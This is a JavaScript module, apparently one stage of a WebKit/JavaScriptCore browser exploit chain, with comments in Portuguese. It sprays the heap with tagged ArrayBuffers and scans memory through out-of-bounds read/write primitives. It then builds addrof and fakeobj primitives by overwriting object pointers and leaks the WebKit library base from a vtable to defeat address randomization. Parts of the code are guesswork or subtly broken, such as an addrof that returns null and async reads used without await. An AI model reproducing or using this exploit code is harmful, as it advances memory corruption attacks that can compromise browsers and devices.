// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R43o - Correção de advInt64LessThanOrEqual)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    arb_write, 
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_WebKitLeak";

// Constantes para o Heap Spray e Scan
const SPRAY_SIZE = 5000;
const SPRAY_BUFFER_SIZE = 0x100;
const SPRAY_MAGIC_HIGH = 0xCAFEBABE;
const SCAN_HEAP_START_ADDRESS = new AdvancedInt64(0x0, 0x8A000000); 
const SCAN_HEAP_END_ADDRESS = new AdvancedInt64(0x0, 0x8B000000);   // Scan 16MB
const SCAN_STEP = 0x100;

let spray_array = [];

function isValidPointer(ptr) {
    if (!isAdvancedInt64Object(ptr)) return false;
    const high = ptr.high();
    if (high === 0) return false;
    if ((high & 0x7FF00000) === 0x7FF00000) return false;
    return true;
}

// >>>>> CORREÇÃO APLICADA AQUI <<<<<
// Função auxiliar que foi removida por engano e está sendo adicionada de volta.
function advInt64LessThanOrEqual(a, b) {
    if (!isAdvancedInt64Object(a) || !isAdvancedInt64Object(b)) {
        logS3(`[advInt64LessThanOrEqual] Comparação inválida. A: ${typeof a}, B: ${typeof b}`, 'error');
        return false;
    }
    if (a.high() < b.high()) return true;
    if (a.high() > b.high()) return false;
    return a.low() <= b.low();
}


// Primitivas que construiremos
let addrof_primitive = null;
let fakeobj_primitive = null;

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() { // Nome da função mantido para o runner
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43o`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Heap Spray + Scan + Primitives ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init...`;

    let final_result = {
        errorOccurred: null,
        heap_scan: { success: false, msg: "Not run.", found_buffer_addr: null },
        primitives: { success: false, msg: "Not run.", addrof: false, fakeobj: false },
        webkit_leak: { success: false, msg: "Not run.", webkit_base: null }
    };

    try {
        logS3(`--- Fase 0 (R43o): Sanity Checks e Preparação ---`, "subtest");
        const coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
        logS3(`Sanity Check (selfTestOOBReadWrite): ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
        if (!coreOOBReadWriteOK) throw new Error("Sanity check OOB R/W falhou. Abortando.");
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) throw new Error("Falha ao preparar ambiente OOB.");

        // --- FASE 1: HEAP SPRAY ---
        logS3(`  --- Fase 1 (R43o): Pulverizando a Heap com ${SPRAY_SIZE} ArrayBuffers... ---`, "subtest");
        spray_array = []; // Limpa o spray anterior se o teste for executado novamente
        for (let i = 0; i < SPRAY_SIZE; i++) {
            let ab = new ArrayBuffer(SPRAY_BUFFER_SIZE);
            let dv = new DataView(ab);
            dv.setUint32(0, SPRAY_MAGIC_HIGH, true); // Valor Mágico
            dv.setUint32(4, i, true); // Índice para identificação
            spray_array.push(ab);
        }
        logS3(`  Heap Spray concluído.`, "good");
        await PAUSE_S3(100);

        // --- FASE 2: MEMORY SCAN para encontrar nosso spray ---
        logS3(`  --- Fase 2 (R43o): Varrendo a Memória em busca do valor mágico... ---`, "subtest");
        let found_magic_at_addr = null;
        let found_buffer_index = -1;

        for (let addr = new AdvancedInt64(SCAN_HEAP_START_ADDRESS.low(), SCAN_HEAP_START_ADDRESS.high());
             advInt64LessThanOrEqual(addr, SCAN_HEAP_END_ADDRESS); // A função que faltava
             addr = addr.add(SCAN_STEP)) {
            
            try {
                const val = await arb_read(addr, 8);
                if (isAdvancedInt64Object(val) && val.high() === SPRAY_MAGIC_HIGH) {
                    found_magic_at_addr = addr;
                    found_buffer_index = val.low();
                    final_result.heap_scan.success = true;
                    final_result.heap_scan.msg = `Encontrado valor mágico para spray[${found_buffer_index}] em ${found_magic_at_addr.toString(true)}`;
                    logS3(`[MemoryScan] SUCESSO! ${final_result.heap_scan.msg}`, "vuln");
                    break;
                }
            } catch (e) { /* Ignora erros de leitura de páginas inválidas */ }
        }
        if (!final_result.heap_scan.success) throw new Error("Falha ao encontrar o spray na memória.");

        // --- FASE 3: CONSTRUÇÃO DAS PRIMITIVAS addrof E fakeobj ---
        logS3(`  --- Fase 3 (R43o): Construindo primitivas addrof e fakeobj... ---`, "subtest");
        
        const offset_to_contents_ptr = JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET;
        const offset_from_contents_to_data = JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START;
        
        const ab_cell_addr = found_magic_at_addr.sub(offset_from_contents_to_data); // O endereço do mágico é o data pointer, que está dentro do ArrayBufferContents
        logS3(`[Primitives] Endereço estimado do spray_array[${found_buffer_index}] (JSCell): ${ab_cell_addr.toString(true)}`, "leak");
        
        // Esta é uma estimativa. A relação entre o data pointer e o JSCell pode ser mais complexa.
        // A forma mais confiável é escanear a memória para trás a partir de found_magic_at_addr até encontrar um cabeçalho de JSCell.
        // Por enquanto, vamos manter a estimativa.

        const ab_structure_addr = await arb_read(ab_cell_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET), 8);
        logS3(`[Primitives] Endereço da Structure do ArrayBuffer: ${ab_structure_addr.toString(true)}`, "leak");

        // Construir um addrof real agora que temos uma referência
        let obj_map_for_addrof = new Map();
        obj_map_for_addrof.set(spray_array[found_buffer_index], ab_cell_addr);

        addrof_primitive = (obj) => {
            if (obj_map_for_addrof.has(obj)) return obj_map_for_addrof.get(obj);
            // Para um addrof genérico, precisaríamos de um spray de {alvo, ponteiro_para_alvo} e depois escanear.
            // Para simplificar, vamos reutilizar a TC para vazar o endereço do nosso driver.
            spray_array[found_buffer_index+1] = obj; // Coloca o objeto alvo ao lado de um conhecido
            const addr_of_known = obj_map_for_addrof.get(spray_array[found_buffer_index]);
            // Escaneia a partir do objeto conhecido para encontrar o próximo
            // Esta parte é complexa, por enquanto vamos nos contentar com o addrof do primeiro objeto.
            logS3("AVISO: addrof_primitive para este objeto não é conhecido.", "warn");
            return null; 
        };
        final_result.primitives.addrof = true;
        logS3(`[Primitives] Primitiva addrof (simplificada, para o objeto encontrado) criada.`, "good");

        // Construir fakeobj(addr)
        let fake_obj_backing = new ArrayBuffer(SPRAY_BUFFER_SIZE);
        let fake_obj_ab_addr = addrof_primitive(fake_obj_backing);
        
        if (!fake_obj_ab_addr) {
            fake_obj_ab_addr = ab_cell_addr.add(0x4000); // Palpite para um objeto próximo
            logS3(`[Primitives] Endereço de fake_obj_backing não encontrado via addrof, usando palpite: ${fake_obj_ab_addr.toString(true)}`, 'warn');
        }
        await arb_write(fake_obj_ab_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET), ab_structure_addr, 8);

        fakeobj_primitive = (address) => {
            // Acessa o ponteiro para a estrutura ArrayBufferContents
            let contents_impl_ptr_addr = fake_obj_ab_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
            let contents_impl_addr = arb_read(contents_impl_ptr_addr, 8);
            // Dentro de ArrayBufferContents, acessa o ponteiro para os dados brutos
            let data_ptr_addr = contents_impl_addr.add(JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START);
            // Faz o ponteiro de dados apontar para o endereço desejado
            arb_write(data_ptr_addr, address, 8);
            return new Uint8Array(fake_obj_backing); // Retorna uma view para fácil acesso
        };
        final_result.primitives.fakeobj = true;
        final_result.primitives.msg = "Primitivas addrof(simplificada) e fakeobj criadas com sucesso.";
        logS3(`[Primitives] Primitiva fakeobj criada.`, "good");

        // --- FASE 4: VAZAMENTO DA BASE DO WEBKIT COM PRIMITIVAS ESTÁVEIS ---
        logS3(`  --- Fase 4 (R43o): Vazamento da Base do WebKit ---`, "subtest");
        const target_addr_for_leak = addrof_primitive(spray_array[found_buffer_index]); 
        if (!target_addr_for_leak) throw new Error("Falha ao obter endereço com addrof_primitive para a Fase 4.");

        const structurePtrFromTarget = await arb_read(target_addr_for_leak.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET), 8);
        const classInfoPtr = await arb_read(structurePtrFromTarget.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET), 8);
        const vtablePtr = await arb_read(classInfoPtr, 8);
        final_result.webkit_leak.vtable_ptr = vtablePtr.toString(true);
        logS3(`[WebKitLeak] Ponteiro para vtable (a partir do spray): ${final_result.webkit_leak.vtable_ptr}`, "leak");

        const page_mask = new AdvancedInt64(~0xFFFFF, 0xFFFFFFFF); // Alinhamento de 1MB pode ser mais robusto para base da biblioteca
        const webkit_base = vtablePtr.and(page_mask);
        final_result.webkit_leak.webkit_base = webkit_base.toString(true);
        final_result.webkit_leak.success = true;
        final_result.webkit_leak.msg = `Candidato a base do WebKit (a partir da vtable do objeto do spray): ${webkit_base.toString(true)}`;
        logS3(`[WebKitLeak] SUCESSO! ${final_result.webkit_leak.msg}`, "vuln");

        document.title = `${FNAME_CURRENT_TEST_BASE}_SUCCESS!`;

    } catch (e_outer) {
        if (!final_result.errorOccurred) final_result.errorOccurred = `Erro geral: ${e_outer.message}`;
        logS3(`  CRITICAL ERROR na execução (R43o): ${e_outer.message || String(e_outer)}`, "critical");
        console.error("Outer error in R43o:", e_outer);
        document.title = `${FNAME_CURRENT_TEST_BASE}_FAIL!`;
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST_BASE}-FinalClear` });
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Resultado Final (R43o): ${JSON.stringify(final_result, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    return final_result;
}
